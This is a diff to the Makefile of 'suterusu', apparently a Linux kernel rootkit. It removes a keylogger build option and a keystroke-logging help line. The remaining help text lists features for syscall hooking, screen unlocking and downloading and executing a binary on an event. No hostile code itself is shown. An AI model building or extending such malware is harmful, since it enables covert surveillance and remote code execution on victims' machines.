@@ -1,15 +1,12 @@
 obj-m += suterusu.o
 suterusu-objs := main.o util.o module.o
 
-ifdef KEYLOGGER
-	suterusu-objs += keylogger.o
-	MODULES += -D_CONFIG_KEYLOGGER_
 ifdef UNLOCK
 	MODULES += -D_CONFIG_UNLOCK_
 endif
+
 ifdef LOGFILE
 	MODULES += -D_CONFIG_LOGFILE_
-endif
 endif
 
 ifdef HOOKRW
@@ -50,7 +47,6 @@ default:
 	@echo
 	@echo "Supported modules:"
 	@echo "  UNLOCK     Unlock the screen upon given key sequence"
-	@echo "  LOGFILE    Log keystrokes to a local file"
 	@echo "HOOKRW       Hook sys_read and sys_write"
 	@echo "HOOKTS       Hook sys_utime"
 	@echo "DLEXEC       Download & execute a binary upon event"
